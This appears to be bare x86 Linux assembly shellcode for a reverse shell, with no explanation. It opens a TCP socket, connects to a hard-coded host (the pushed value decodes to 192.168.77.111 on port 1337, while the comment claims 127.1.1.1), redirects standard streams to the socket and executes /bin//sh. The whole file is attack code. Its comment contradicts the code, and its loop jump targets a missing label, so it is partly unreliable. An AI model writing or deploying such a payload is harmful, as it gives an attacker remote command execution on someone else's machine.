
global _start
section .text
_start:


push   0x66
pop    eax
push   0x1
pop    ebx
xor    edx,edx
push   edx
push   ebx
push   0x2
mov    ecx,esp
int    0x80
xchg   edx,eax
mov    al,0x66
;push   0x101017f; <ip: 127.1.1.1
push   0x6f4da8c0 ; <ip: 127.1.1.1
pushw  0x3905 ;<port: 1337
inc    ebx
push   bx
mov    ecx,esp
push   0x10
push   ecx
push   edx
mov    ecx,esp
inc    ebx
int    0x80
push   0x2
pop    ecx
xchg   edx,ebx


mov    al,0x3f
int    0x80
dec    ecx
jns    2f ;<loop>
mov    al,0xb
inc    ecx
mov    edx,ecx
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
